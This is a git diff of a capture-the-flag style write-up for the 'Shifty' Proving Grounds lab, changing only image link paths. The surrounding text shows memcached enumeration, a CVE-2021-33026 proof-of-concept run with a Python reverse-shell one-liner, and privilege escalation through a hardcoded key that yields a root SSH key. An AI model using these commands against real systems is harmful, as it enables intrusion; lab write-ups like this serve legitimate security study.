@@ -83,7 +83,7 @@ The stat command can show us some access information, but nothing useful.
 memcstat --servers=192.168.100.59
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_13h41m57s_001_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_13h41m57s_001_.png)
 
 
 Next we try to get the website store items, but it doesn't return anything back.
@@ -92,15 +92,15 @@ Next we try to get the website store items, but it doesn't return anything back.
 memcdump --servers=192.168.100.59
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_13h52m35s_002_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_13h52m35s_002_.png)
 
 We have to browse the website on port 5000 first and it will generate the session.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_14h00m00s_003_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_14h00m00s_003_.png)
 
 I was stuck here for a long time and then I accidentally noticed that this is a demo site made with FLASK, so I tried to search for FLASK, memcache and exploit as keywords and found vulnerability [CVE-2021-33026](https://github.com/CarlosG13/CVE-2021-33026).
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_14h01m53s_004_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_14h01m53s_004_.png)
 
 Following the instructions for using the vulnerability We try to send the remote shell command.
 
@@ -108,11 +108,11 @@ Following the instructions for using the vulnerability We try to send the remote
 python3 cve-2021-33026_PoC.py --rhost 192.168.100.59 --rport 5000 --cmd "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.100\",11211));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'" --cookie "session:f246b931-de84-4794-ba25-59c4bd3835df" 
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_14h28m16s_005_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_14h28m16s_005_.png)
 
 Successfully obtained shell.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_14h28m41s_006_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_14h28m41s_006_.png)
 
 #### Privilege Escalation
 
@@ -120,9 +120,9 @@ Successfully obtained shell.
 
 The ```/opt/backups/backup.py``` file contains hardcoded key.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_22h58m08s_007_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_22h58m08s_007_.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_23h08m17s_008_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_23h08m17s_008_.png)
 
 Creating decrypt script file.
 
@@ -148,11 +148,11 @@ Decrypting backup files.
 python decrypt.py 31328fa57f5c504df041f7f4f45498c766c0d12c33f78f33cff66bca
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_23h17m59s_009_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_23h17m59s_009_.png)
 
 It's a SSH private key.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_23h21m20s_010_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_23h21m20s_010_.png)
 
 Using this SSH key for authentication.
 
@@ -162,4 +162,4 @@ chmod 400 id_rsa
 ssh -i id_rsa root@192.168.134.59
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_23h31m38s_011_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shifty/Shifty_2022.01.01_23h31m38s_011_.png)
